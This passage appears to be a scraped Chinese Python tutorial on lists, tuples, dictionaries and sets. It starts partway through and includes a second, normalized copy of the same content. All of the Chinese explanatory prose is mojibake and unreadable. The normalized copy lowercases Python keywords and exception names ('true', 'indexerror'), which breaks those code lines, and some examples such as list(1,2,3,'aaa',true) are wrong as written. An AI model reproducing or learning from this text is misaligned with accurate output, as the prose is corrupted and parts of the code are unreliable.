60, 50, 40, 30, 20, 10]\n\nåçæä½æ¶å¦æç´¢å¼è¶çäºä¹ä¸ä¼æ¥éï¼å¦æstartå°äº0ä¼è¢«çä½0ï¼å¦æendå¤§äºlen-1ä¼è¢«çä½len-1ã\n\n\n# å¶ä»åè¡¨å½æ°\n\n 1. æ±æå¤§æå°å¼\n    \n    # max å minç¨äºæ±åè¡¨ä¸­çæå¤§æå°å¼\n    a = [1,2,3,4,5,6]\n    print(max(a)) # 6\n    print(min(a)) # 1\n    a = [1,\"a\",True]\n    print(max(a))\n    print(min(a)) # ä¸åç±»ååç´ æ¯è¾ä¼æ¥é\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n\n 2. åç´ æ±å\n    \n    a = [1,2,3,4,5,6,7,8]\n    print(sum(a)) # 36\n    a = ['a',1,2,3,True]\n    print(sum(a)) # TypeError: unsupported operand type(s) for +: 'int' and 'str'\n    \n    \n    1\n    2\n    3\n    4\n    \n\n\n# å¤ç»´åè¡¨\n\nä¸ç»´åè¡¨å¯ä»¥å¸®å©æä»¬å­å¨ä¸ç»´ãçº¿æ§çæ°æ®ã äºç»´åè¡¨å¯ä»¥å¸®å©æä»¬å­å¨äºç»´ãè¡¨æ ¼çæ°æ®ãäºç»´æ°ç»çç¬¬ä¸ä¸ªç»´åº¦ä¸­å­å¨äºäºç»´åº¦çåè¡¨èµ·å§å°åã\n\na = [\n    [1,2,3,4],\n    [2,3,4,5],\n    [5,6,7,8],\n    [6,7,8,9]\n]\nprint(a)\n\n# éåa\nfor i in range(4):\n    for j in range(4):\n        print(a[i][j],end=\"\\t\")\n    print()\n    \n\"\"\"\n1\t2\t3\t4\t\n2\t3\t4\t5\t\n5\t6\t7\t8\t\n6\t7\t8\t9\t\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# åç»\n\nåç»ååè¡¨ä¸ä¸æ ·ï¼åè¡¨æ¶å¯åçï¼å¯ä»¥ä¿®æ¹å é¤å¢å ãèåç»ä¸æ¦åå»ºäºå°±åºå®äºï¼æ²¡æåæ³å¢å æ¹ã\n\n\n# åå»ºåç»\n\n 1. éè¿æ¬å·åå»ºåç»\n    \n    # éè¿ï¼ï¼åå»ºåç»\n    a = (1,2,3,4)\n    b = 1,2,3,4\n    print(a) # (1, 2, 3, 4)\n    print(b) # (1, 2, 3, 4)\n    \n    # å¦æåç»ä¸­åªæä¸ä¸ªåç´ åå¿é¡»å ï¼\n    \n    a = (1)\n    print(type(a)) # <class 'int'>\n    a = (1,)\n    print(type(a)) # <class 'tuple'>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    \n\n 2. éè¿tupleåå»ºåç»\n    \n    a = tuple() # ()\n    b = tuple(\"abc\") # ('a', 'b', 'c')\n    c = tuple(range(5)) # (0, 1, 2, 3, 4)\n    d = tuple([1,2,3,4,5]) # (1, 2, 3, 4, 5)\n    print(a)\n    print(b)\n    print(c)\n    print(d)\n    \n    # tupleä¸­å¯ä»¥æ¥ååè¡¨ãå­ç¬¦ä¸²ãå¶ä»åºåç±»åãè¿­ä»£å¨ç­ç¨äºçæåç»\n    # listä¸­å¯ä»¥æ¥ååç»ãå­ç¬¦ä¸²ãå¶ä»åºåç±»åãè¿­ä»£å¨ç­ç¨äºçæåè¡¨\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    \n    3. çæå¨æ¨å¯¼å¼åå»ºåç»\n    \n    è¿éççæå¨æ¨å¯¼å¼åä¸é¢çåè¡¨æ¨å¯¼å¼ç±»ä¼¼ï¼çæå¨æ¨å¯¼å¼ä½¿ç¨å°æ¬å·ãåè¡¨æ¨å¯¼å¼å¯ä»¥ç´æ¥çæåè¡¨å¯¹è±¡ï¼èçæå¨æ¨å¯¼å¼çæçæ¯ä¸ä¸ªçæå¨å¯¹è±¡ãæä»¬å°çæå¨æ¨å¯¼å¼ä½¿ç¨tupleçæåç»ï¼æèä½¿ç¨__next__()è¿è¡éåãåç´ è®¿é®ä¹åå°±ä¼è¢«å é¤ã\n    \n    s = (x*2 for x in range(10))\n    print(s) # <generator object <genexpr> at 0x7fafc00fdb60>\n    # print(list(s)) # [0, 2, 4, 6, 8, 10, 12, 14, 16, 18]\n    # print(tuple(s)) # (0, 2, 4, 6, 8, 10, 12, 14, 16, 18)\n    print(s.__next__()) # 0\n    print(s.__next__()) # 2\n    print(list(s)) # [4, 6, 8, 10, 12, 14, 16, 18]\n    print(tuple(s)) # ()\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    \n\n\n# åç´ è®¿é®åè®¡æ°\n\nåç»ä¸­çåç´ æ æ³ä¿®æ¹ï¼å¦æä¿®æ¹åä¼æ¥éã\n\na = tuple(range(10))\nprint(a[2]) # 2\na[2] = 3 # TypeError: 'tuple' object does not support item assignment\n\n\n1\n2\n3\n\n\nåç»çåçååè¡¨ä¸æ ·ï¼è¿åçæ¯åç»åçãä½¿ç¨åç½®çsortedæ¹æ³å¯ä»¥å¯¹çæåç»çæ°çæåºä¹åçåè¡¨å¯¹è±¡ã\n\na = tuple(range(10))\n\nprint(a[:8]) # (0, 1, 2, 3, 4, 5, 6, 7)\nprint(a[4:]) # (4, 5, 6, 7, 8, 9)\nprint(a[4:8]) # (4, 5, 6, 7)\nprint(a[4:8:2]) # (4, 6)\nprint(a[::-1]) # (9, 8, 7, 6, 5, 4, 3, 2, 1, 0)\nprint(a[-8:-2]) # (2, 3, 4, 5, 6, 7)\n\nb = sorted(a,reverse=True)\nprint(b) # [9, 8, 7, 6, 5, 4, 3, 2, 1, 0] \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nzipå½æ°å¯ä»¥å°å¤ä¸ªåè¡¨å¯¹åºä½ç½®çåç´ ç»åæä¸ºåç»ï¼å¹¶è¿åzipå¯¹è±¡ã\n\na = [1,2,3]\nb = [4,5,6]\nc = [7,8,9]\nd = zip(a,b,c)\nprint(d)  # <zip object at 0x7fa930060540>\nprint(list(d))  # [(1, 4, 7), (2, 5, 8), (3, 6, 9)]\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# å­å¸\n\nPythonä¸­çå­å¸ç±»ä¼¼äºJavaä¸­çMapç±»åãå­å¸æ¯é®å¼å¯¹çæ åºå¯åçåºåï¼å­å¸ä¸­çåç´ é½æ¯ä¸ä¸ªä¸ªçé®å¼å¯¹ãå¨å­å¸ä¸­ï¼å¯ä»¥éè¿æå®çé®å®ä½å°å¼å¯¹è±¡ãé®æ¯ä»»æçä¸å¯åå¯¹è±¡ï¼å¦æ´æ°ãæµ®ç¹æ°ãåç»ç­ç­ï¼åè¡¨ãå­å¸ãéåç­ä¸å¯ä½ä¸ºé®ãå­å¸çå®ä¹æ¹å¼å¦ä¸ï¼\n\na = {'hello':'world','time':'2022-11-22',12:'age'}\n\n\n1\n\n\n\n# åå»ºå­å¸\n\n 1. éè¿å¤§æ¬å·åå»ºå­å¸\n    \n    # {} åå»ºå­å¸\n    a = {'name':'zhangsan','age':12,11:12}\n    print(type(a)) # <class 'dict'>\n    \n    \n    1\n    2\n    3\n    \n\n 2. éè¿dict()åå»ºå­å¸\n    \n    # dictåå»ºå­å¸\n    a = dict(name='zhangsan',age=12)\n    b = dict([('name','zhangsan'),('age',12),(12,22)])\n    c = {}\n    d = dict()\n    print(a) # {'name': 'zhangsan', 'age': 12}\n    print(b) # {'name': 'zhangsan', 'age': 12, 12: 22}\n    print(c) # {}\n    print(d) # {}\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    \n\n 3. éè¿zip()åå»ºå­å¸\n    \n    k = ['name','age',12]\n    v = ['zhangsan','12',22]\n    d = dict(zip(k,v))\n    print(d)  # {'name': 'zhangsan', 'age': '12', 12: 22}\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 4. éè¿fromkeysåå»ºç©ºå¼å­å¸\n    \n    a = dict.fromkeys(['name','age',12])\n    print(a)\n    \n    \n    1\n    2\n    \n\n\n# å­å¸åç´ çè®¿é®\n\na = {'name':'zhangsan','age':18,'job':'IT'}\nprint(a['name']) # zhangsan\n# print(a['sex'])  # KeyError: 'sex'\n\nprint(a.get('name')) # zhangsan\nprint(a.get('sex')) # None\nprint(a.get('sex','nan')) # nan è¿åä¸ä¸ªé»è®¤å¼\n\nprint(a.items()) # dict_items([('name', 'zhangsan'), ('age', 18), ('job', 'IT')])\n\nprint(a.keys()) # dict_keys(['name', 'age', 'job'])\nprint(a.values()) # dict_values(['zhangsan', 18, 'IT'])\n\nprint(len(a)) # 3\nprint('name' in a) # True\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# å­å¸å¢å æ¹\n\n 1. æ°å¢é®å¼å¯¹ï¼å­å¨åè¦ç\n    \n    a = {'name':'zhangsan','age':12,'sex':True}\n    a['birth'] = '2022-12-22'\n    print(a) # {'name': 'zhangsan', 'age': 12, 'sex': True, 'birth': '2022-12-22'}\n    a['name']='lisi'\n    print(a) # {'name': 'lisi', 'age': 12, 'sex': True}\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 2. updateå°æ°å­å¸è¦çå°æ§å­å¸ä¸\n    \n    a = {'name':'zhangsan','age':12,'sex':True}\n    b = {'name':'wangwu','age':20,'sex':True,'birth':'20202222'}\n    a.update(b)\n    print(a) # {'name': 'wangwu', 'age': 20, 'sex': True, 'birth': '20202222'}\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 3. delæ¹æ³å é¤é®å¼å¯¹\n    \n    a = {'name':'zhangsan','age':12,'sex':True}\n    \n    del a['name']\n    print(a) # {'age': 12, 'sex': True}\t\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 4. clearæ¹æ³å é¤ææé®å¼å¯¹\n    \n    a.clear()\n    print(a) # {}\n    \n    \n    1\n    2\n    \n\n 5. popå é¤æå®é®å¼å¯¹\n    \n    b = a.pop(\"name\")\n    print(b) # zhangsan\n    print(a) # {'age': 12, 'sex': True}\n    \n    \n    1\n    2\n    3\n    \n\n 6. popiteméæ£å é¤è¿åé®å¼å¯¹\n    \n    b = a.popitem()\n    print(b) # ('sex', True)\n    print(a) # {'name': 'zhangsan', 'age': 12}\n    \n    \n    1\n    2\n    3\n    \n\n\n# è¯­æ³ç³ ä¹ åºåè§£å\n\nåºåè§£åå¯ä»¥å¾æ¹ä¾¿çå¸®å©æä»¬åæ¶ç»å¤ä¸ªåéèµå¼ãå¯ä»¥ä½ç¨äºåç»ãåè¡¨ãå­å¸ä¹ä¸ã\n\nx,y,z = (1,2,3)\nprint(x,y,z) # 1 2 3\n\n(a,b,c) = (3,4,5)\nprint(a,b,c) # 3 4 5\n\n[a,b,c,d] = [1,2,2,3]\nprint(a,b,c,d) # 1 2 2 3\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nåºåè§£ååæ¶å¯ä»¥ä½ç¨äºå­å¸ä¹ä¸ï¼å¦ææ¯å­å¸ï¼åé»è®¤æ¯key\n\na = {'name':'zhngsan','age':12,'sex':True}\nx,y,z = a\nprint(x,y,z) # name age sex\n\n\n1\n2\n3\n\n\nå¯ä»¥ä½¿ç¨å­å¸çitemsåvaluesè·åå°é®å¼å¯¹åºå\n\na = {'name':'zhngsan','age':12,'sex':True}\n\nx,y,z = a.items()\nprint(x,y,z) # ('name', 'zhngsan') ('age', 12) ('sex', True)\nx,y,z = a.values()\nprint(x,y,z) # zhngsan 12 True\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# åè¡¨ç»åå­å¸å­å¨åè®¿é®æ°æ®\n\nå§å    å¹´é¾   èªèµ      åå¸\né«å°ä¸   18   30000   åäº¬\né«å°äº   19   20000   ä¸æµ·\né«å°äº   20   10000   æ·±å³\n\nr1 = {\"name\":\"é«å°ä¸\",\"age\":18,\"salary\":30000,\"city\":\"åäº¬\"}\nr2 = {\"name\":\"é«å°äº\",\"age\":19,\"salary\":20000,\"city\":\"ä¸æµ·\"}\nr3 = {\"name\":\"é«å°äº\",\"age\":20,\"salary\":10000,\"city\":\"æ·±å³\"}\ntb = [r1,r2,r3]\n\n#è·å¾ç¬¬äºè¡çäººçèªèµ\nprint(tb[1].get(\"salary\"))\n#æå°è¡¨ä¸­ææççèªèµ\nfor i in range(len(tb)):\n  print(tb[i].get(\"salary\"))\n#æå°è¡¨çæææ°æ® for i in range(len(tb)):\n  print(tb[i].get(\"name\"),tb[i].get(\"age\"),tb[i].get(\"salary\"),tb[i].get(\"city\"))\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# å­å¸åºå±åç\n\nå­å¸çæ ¸å¿å°±æ¯æ£åè¡¨ï¼æ£åè¡¨æ¯ä¸ä¸ªç¨çæ°ç»ï¼æ°ç»çååç§°ä¸ºbucketãæ¯ä¸ªbucketåå«ä¸¤ä¸ªé¨åï¼ä¸ä¸ªæ¯é®çå¼ç¨ï¼ä¸ä¸ªæ¯å¼çå¼ç¨ã\n\n# å¦ä½å°ä¸ä¸ªé®å¼å¯¹å­å¨å°å­å¸ä¸­\n\né¦åæ¯åå»ºä¸ä¸ªå­å¸ï¼ä¸ºå­å¸åéåå­ç©ºé´ï¼è¿éä¸ºæ¹ä¾¿è®¡ç®ï¼éç¨é¿åº¦ä¸º8ãç¶åè·åå°è¿ä¸ªé®å¼å¯¹çkeyçhashå¼ï¼ç¶åï¼å ä¸ºæ°ç»çé¿åº¦ä¸º8ï¼æä»¬åå³è¾¹3ä½åç§»éï¼è½¬åä¸ºå¯¹åºçåè¿å¶æ°æ®ï¼ç¶åæ¥çåç§»é5å¯¹åºçæ°ç»ä½ç½®ä¸æ¯ä¸æ¯ç©ºçï¼å¦ææ¯ï¼åå°é®å¼å¯¹æ¾å¥ãå¦æä¸æ¯åååå³åä¸ä½åç§»éãç´å°åç°ç©ºçbucketã\n\n# å¦ä½æ ¹æ®é®æ¥æ¾å¼\n\nå½æä»¬éè¦æ¥æ¾å¼çæ¶åï¼é¦åæ¯è·åå°é®çhashï¼å¦ææ°ç»é¿åº¦ä¸º8ï¼åè·åå³3ä½ä½ä¸ºåç§»éï¼ç¶åæ¥çå¯¹åºçä½ç½®æ¯å¦ä¸ºç©ºãå¦æä¸ºç©ºåè¿åNoneãå¦æä¸æ¯ç©ºï¼è®¡ç®è¿ä¸ªbucketçkeyçhashï¼æ¯è¾æ¯å¦åå½åæ¥è¯¢çé®çhashä¸è´ãå¦æä¸è´åè¿åå¼ãå¦æä¸ä¸è´ï¼åç»§ç»­åå³åä¸ä½è¿è¡æ¯è¾ï¼ç´å°æåï¼å¦ææ²¡æåç°ï¼è¿åNoneã\n\n\n# éå\n\néåæ¯æ åºçå¯ååºåï¼ä½æ¯åç´ ä¸è½éå¤ãç±»ä¼¼äºJavaä¸­çsetãéååºå±æ¯éè¿å­å¸å®ç°çãéåçææåç´ é½æ¯å­å¸çé®ï¼å æ­¤ä¸å¯éå¤ã\n\n\n# éåçç¸å³æä½\n\n 1. ä½¿ç¨å¤§æ¬å·åå»ºéå\n    \n    a = {1,2,3,'hello'}\n    print(a) #  {1, 2, 3, 'hello'}\n    print(type(a)) # <class 'set'>\n    \n    \n    1\n    2\n    3\n    \n\n 2. ä½¿ç¨setåå»ºéå\n    \n    a = [1,2,2,2,3,4]\n    b = set(a)\n    print(b) # {1, 2, 3, 4}\n    \n    \n    1\n    2\n    3\n    \n\n 3. ä½¿ç¨addæ·»å åç´ \n    \n    a = {}\n    print(type(a)) # <class 'dict'>\n    a = set()\n    print(type(a)) # <class 'set'>\n    a.add(1)\n    a.add(1)\n    print(a) # {1}\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n\n 4. ä½¿ç¨removeå é¤åç´ \n    \n    a = {1,2,3,4,5,6}\n    a.remove(1)\n    a.remove(2)\n    # a.remove(7) # KeyError: 7\n    print(a) # {3, 4, 5, 6}\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 5. ä½¿ç¨clearæ¸ç©ºéå\n    \n    a = {1,2,3,4,5}\n    a.clear()\n    print(a) # set()\n    \n    \n    1\n    2\n    3\n    \n\n 6. éåçäº¤å·®å¹¶æä½\n    \n    a = {1,2,3,4}\n    b = {3,4,5,6}\n    print(a|b) # å¹¶ # {1, 2, 3, 4, 5, 6}\n    print(a&b) # äº¤ # {3, 4}\n    print(a - b) # å·® # {1, 2}\n    \n    print(a.union(b))# å¹¶ # {1, 2, 3, 4, 5, 6}\n    print(a.intersection(b))# äº¤ # {3, 4}\n    print(a.difference(b))# å·® # {1, 2}\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    \n\n\n# åèèµæ\n\nå°å­¦å Pythonæç¨ï¼https://www.bjsxt.com",normalizedContent:"# pythonåºåçé£äºäº\n\n> æ¥ä¸ä¸ç¯çãpythonå­ç¬¦ä¸²çé£äºäºãï¼è¿ç¯åå¤æ´çä¸ä¸ python ä¸­çåºåç±»åçåºç¡ç¨æ³ï¼åå«ï¼å­ç¬¦ä¸²ãåè¡¨ãåç»ãå­å¸ãéåãåç»­æç¸å³çæ·±å¥äºè§£ï¼ä¹ä¼æ´æ°å°è¿éãå­ç¬¦ä¸²å¨ä¸ä¸ç¯è¯´è¿ï¼è¿éå°±ä¸åèµè¿°ã\n\n\n# åè¡¨\n\nåè¡¨æ¯å¯ä»¥å­å¨ ä»»ææ°ç®ãä»»æç±»åçæ°æ®éåãåè¡¨åç½®äºå¯åçåºåï¼åå«å¤ä¸ªåç´ ç æåºä¸è¿ç»­ç åå­ç©ºé´ãå®ä¹æ¹å¼å¦ï¼a = [1,2,3,4]ãå¶ä¸­1ã2ã3ã4ä¸ºåè¡¨açåç´ ï¼åç´ ä¸­å­å¨çæ°æ®ç±»åå¯ä»¥ä»»æï¼ä¸æ¯ä¸å®ç¸åãåè¡¨æå¦ä¸çä¸äºå¸¸ç¨æ¹æ³ï¼\n\næ¹æ³                     è¦ç¹       æè¿°\nlist.append(x)         å¢å åç´      å°åç´  x å¢å å°åè¡¨ list å°¾é¨\nlist.extend(alist)     å¢å åç´      å°åè¡¨ alist ææåç´ å å°åè¡¨ list å°¾é¨\nlist.insert(index,x)   å¢å åç´      å¨åè¡¨ list æå®ä½ç½® index å¤æå¥åç´  x\nlist.remove(x)         å é¤åç´      å¨åè¡¨ list ä¸­å é¤é¦æ¬¡åºç°çæå®åç´  x\nlist.pop([index])      å é¤åç´      å é¤å¹¶è¿ååè¡¨ list æå®ä¸ºæ­¢ index å¤çåç´ ï¼é»è®¤æ¯ æåä¸ä¸ªåç´ \nlist.clear()           å é¤ææåç´    å é¤åè¡¨ææåç´ ï¼å¹¶ä¸æ¯å é¤åè¡¨å¯¹è±¡\nlist.index(x)          è®¿é®åç´      è¿åç¬¬ä¸ä¸ª x çç´¢å¼ä½ç½®ï¼è¥ä¸å­å¨ x åç´ æåºå¼å¸¸\nlist.count(x)          è®¡æ°       è¿åæå®åç´  x å¨åè¡¨ list ä¸­åºç°çæ¬¡æ°\nlen(list)              åè¡¨é¿åº¦     è¿ååè¡¨ä¸­åå«åç´ çä¸ªæ°\nlist.reverse()         ç¿»è½¬åè¡¨     ææåç´ åå°ç¿»è½¬\nlist.sort()            æåº       ææåç´ åå°æåº\nlist.copy()            æµæ·è´      è¿ååè¡¨å¯¹è±¡çæµæ·è´\n\nå­ç¬¦ä¸²ååè¡¨ç±»ä¼¼ï¼é½æ¯åºåçç±»åãå­ç¬¦ä¸²å­å¨çæ¯ç¸åå­ç¬¦ç±»åçåºåï¼èåè¡¨æ¯å­å¨ä»»æç±»åçåºåãå æ­¤ï¼å­ç¬¦ä¸²çä¸äºç¨æ³å¨åè¡¨ä¸ä¹æ¯ä¸æ ·çã\n\n\n# åå»ºåè¡¨\n\nåå»ºåè¡¨æå¤ç§æ¹å¼ï¼è¿éæ´çäºåç§ï¼\n\n 1. åºæ¬çåå»ºæ¹å¼\n    \n    a = [1,2,3,\"hello\",\"world\",true]\n    a = [] # åå»ºç©ºåè¡¨\n    \n    \n    1\n    2\n    \n\n 2. ä½¿ç¨list() åå»º\n    \n    a = list() # åå»ºç©ºåè¡¨\n    a = list(1,2,3,\"aaa\",true)\n    \n    \n    1\n    2\n    \n\n 3. ä½¿ç¨range() åå»º\n    \n    # rangeå¯ä»¥å¸®å©æä»¬åå»ºæ´æ°æ°ç»ï¼è¿å¨forå¾ªç¯ä¸­æå¤§ç¨å¤ã\n    # rangeè¯­æ³æ ¼å¼ä¸ºï¼range(start,end,step)\n    # start: å¯éï¼èµ·å§ä½ç½®ï¼é»è®¤ä¸º0\n    # end: å¿éï¼ç»æä½ç½®\n    # step ï¼ æ­¥é¿ï¼å¯éï¼é»è®¤ä¸º1\n    \n    # å¨python3 ä¸­rangeè¿åä¸ä¸ªrangeå¯¹è±¡ï¼èä¸æ¯ä¸ä¸ªåè¡¨ï¼æä»¬éè¦éè¿listæ¹æ³å°å¶è½¬åä¸ºåè¡¨\n    \n    a = range(5)\n    print(a) # range(0, 5)\n    b = list(range(5))\n    print(b) # [0, 1, 2, 3, 4]\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    \n\n 4. ä½¿ç¨æ¨å¯¼å¼çæåè¡¨\n    \n    # ä½¿ç¨foræ¨å¯¼å¼çæ¹å¼çææ°ç»ï¼å¨å¼åä¸­ä¹æ¯è¾å¸¸è§ã\n    # åºæ¬çä½¿ç¨æ¹å¼å¦ä¸ï¼\n    a = [x*2 for x in range(5)]\n    print(a) # [0, 2, 4, 6, 8]\n    \n    b = [x*2 for x in range(100) if x%10 == 0]\n    print(b) # [0, 20, 40, 60, 80, 100, 120, 140, 160, 180]\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n\n\n# æ°å¢åç´ \n\nåè¡¨æ¯ä¸ä¸ªå¯åçåºåï¼å¦æåºç°æ°å¢åå é¤åç´ æ¶ï¼pythonä¼èªå¨è¿è¡åå­ç®¡çï¼æå¤§çåå°äºç¨åºåçè´æãä½æ¯å ä¸ºæ¯è¿ç»­çæåºåå­ç©ºé´ï¼æä»¥å¨ä¸äºä½ç½®æå¥å é¤åç´ æçæ¯è¾ä½ï¼æä»¬éå¸¸å¨åè¡¨å°¾é¨å é¤åæå¥åç´ ã\n\n 1. append() è¡¨å°¾æ·»å åç´ \n    \n    a = [1,2]\n    a.append(3)\n    print(a)\n    \n    \n    1\n    2\n    3\n    \n\n 2. +è¿ç®ç¬¦æä½\n    \n    # + è¿ç®ç¬¦ å¹¶ä¸æ¯çæ­£çå¾å°¾é¨æ·»å åç´ ï¼èæ¯åå»ºæ°å¯¹è±¡å°ååè¡¨å¤å¶å°æ°åè¡¨ä¸­ï¼æçå¤ªä½\n    a = [1,2]\n    print(id(a)) # 140213503386560\n    a = a+[3,4]\n    print(id(a)) # 140213234351808\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 3. extend() æå±åè¡¨\n    \n    # extend å®æä¸¤ä¸ªåè¡¨çæ¼æ¥ï¼ä¸äº§çæ°å¯¹è±¡\n    a = [1,2]\n    print(id(a)) # 140335909954496\n    b = [3,4]\n    a.extend(b)\n    print(a) # [1, 2, 3, 4]\n    print(id(a)) # 140335909954496\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n\n 4. insert() æå¥åç´ \n    \n    # insert å¯ä»¥å¨ä»»æä½ç½®æå¥åç´ ï¼ä½æ¯è¿æ ·ä¼å¯¼è´åç´ çç§»å¨ï¼æçè¾ä½ï¼é¿åå¨åè¡¨å¤´é¨æå¥åç´ \n    a = [1,2,3,4]\n    a.insert(0,0)\n    print(a) # [0, 1, 2, 3, 4]\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 5. ä¹æ³å¤å¶\n    \n    # ä¹æ³æå± è¿æ¯è¾çç¥å¥ å¦ææ³å¤å¶ä¸ä¸ªåè¡¨ï¼åªéè¦ä½¿ç¨ä¹æ³\n    # å¨å­ç¬¦ä¸²ä¸­ï¼åæ ·å¯ä»¥ä½¿ç¨ä¹æ³çæ¹å¼å¤å¶å­ç¬¦ä¸²\n    \n    a = [\"zhangsan\",22]\n    b = a*3\n    print(b) # ['zhangsan', 22, 'zhangsan', 22, 'zhangsan', 22]\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    \n\n\n# å é¤åç´ \n\nå¨åè¡¨ä¸­çå é¤ä¹ä¼å¯¼è´åç´ çç§»å¨ï¼å æ­¤å°½éé¿åéå°¾é¨åç´ çå é¤ï¼ä¼å¯¼è´æçå¤ªä½ã\n\n 1. delå é¤\n    \n    # del å é¤æå®ä½ç½®çåç´ \n    a = [1,2,3,4]\n    del a[1] # [1, 3, 4]\n    print(a)\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 2. popåºæ \n    \n    # popåºæ  é»è®¤ä»æ«å°¾å é¤ï¼è¿åå¼ä¸ºå é¤çåç´ ï¼ä¹å¯ä»¥ä¼ éindex\n    a = [1,2,3,4]\n    b = a.pop(0)\n    print(a)\n    print(b)\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 3. removeå é¤\n    \n    # remove æå®åç´ å é¤ï¼å é¤ç¬¬ä¸ä¸ªåºç°è¯¥åç´ çä½ç½®\n    a = [1,2,3,4]\n    a.remove(2)\n    print(a) # [1, 3, 4]\n    \n    \n    1\n    2\n    3\n    4\n    \n\n\n# æ¥çåç´ \n\npythonä¸­çåè¡¨ç¸å¯¹äºjavaä¸­çæ°ç»ï¼é½å¯ä»¥éè¿idnexå»è®¿é®ä¸ä¸ªåç´ ãä½æ¯javaä¸­çæ°ç»é¿åº¦ä¸å¯åï¼å¹¶ä¸ä¸å¯ä»¥å­å¨ä»»æçç±»åã\n\n 1. éè¿ç´¢å¼è®¿é®åç´ \n    \n    # éè¿ç´¢å¼è®¿é®åç´  ä»0å¼å§å°len-1\n    a = [2,3,1,4,6,32,2,5,7,2]\n    print(a[0]) # 2\n    print(a[len(a)]) # ç´¢å¼è¶ç indexerror: list index out of range\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 2. index() è·ååç´ çç´¢å¼\n    \n    # indexå¯ä»¥æ¥æ¾ç¬¬ä¸æ¬¡åºç°æä¸ªåç´ çindexï¼å¯ä»¥ä¼ å¥ä¸ä¸ªèå´ï¼ä½¿ç¨çæ¹å¼æ¯ï¼a.index(value,[start],[end])\n    a = [1,2,3,4,5,6,7,8,9,10]\n    print(a.index(1)) # 0\n    print(a.index(3,1,5)) # 2\n    print(a.index(11)) # valueerror: 11 is not in list\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 3. count() è·ååç´ åºç°çæ¬¡æ°\n    \n    # countç¨äºå¤æ­åç´ å¨åè¡¨ä¸­åºç°çæ¬¡æ°,å¦æç»æä¸º0 åè¡¨ç¤ºåè¡¨ä¸­æ²¡æè¿ä¸ªåç´ \n    a = [1,2,3,3,3,4,3,2,1]\n    print(a.count(1)) # 2\n    print(a.count(10)) # 0\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 4. len() è·ååè¡¨çé¿åº¦\n    \n    # len åå­ç¬¦ä¸²ä¸æ ·ï¼lenå¯ä»¥è·ååè¡¨çé¿åº¦\n    a = [1,2,3,4,5,6,7]\n    print(len(a)) # 7\n    \n    \n    1\n    2\n    3\n    \n\n 5. å¤æ­åè¡¨ä¸­å­å¨æå®åç´ \n    \n    # ä¸é¢è¯´å¦æä¸ä¸ªåç´ çcountä¸ç­äº0 åè¯¥åç´ ä¸å¨åè¡¨ä¸­ã\n    # è¿å¯ä»¥éè¿inè¿è¡ç®ä¾¿å¤æ­\n    a = [1,2,3,5,6,7,8,9]\n    print(a.count(4) == 0) # true\n    print(4 in a) # false\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 6. éååè¡¨çåå®¹\n    \n    # ä½¿ç¨forå¾ªç¯éå\n    a = [1,2,3,4,5,6,7]\n    for x in a:\n        print(x,end=\",\") # 1,2,3,4,5,6,7,\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 7. åè¡¨æåº\n    \n    # sort æåº é»è®¤çåº éåºåreverse=true  ä¸æ°å»ºåè¡¨ï¼ä¿®æ¹ååè¡¨\n    # ä¹±åº shuffle\n    \n    a = [1,3,2,4,5,2,6,8,10]\n    a.sort()\n    print(a) # [1, 2, 2, 3, 4, 5, 6, 8, 10]\n    a.sort(reverse=true)\n    print(a) # [10, 8, 6, 5, 4, 3, 2, 2, 1]\n    \n    import random\n    random.shuffle(a)\n    print(a) # [6, 5, 2, 4, 3, 10, 1, 8, 2]\n    \n    # sorted åå»ºæ°åè¡¨ï¼ä¸ä¿®æ¹ååè¡¨\n    a = [20,10,30,40,22]\n    b = sorted(a)\n    print(a) # [20, 10, 30, 40, 22]\n    print(b) # [10, 20, 22, 30, 40]\n    \n    b = sorted(a,reverse=true)\n    print(b) # [40, 30, 22, 20, 10]\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    \n\n 8. åè¡¨è¿­ä»£å¨\n    \n    # å­å¨ä¸ä¸ªåç½®å½æ°reversedä¹å¯ä»¥å¯¹åè¡¨è¿è¡éåºï¼ä½æ¯è¿åçæ¯ä¸ä¸ªè¿­ä»£å¨ã\n    a = [10,2,11,9,13,22]\n    c = reversed(a)\n    print(c) # <list_reverseiterator object at 0x7fd528043fa0>\n    print(list(c))  # 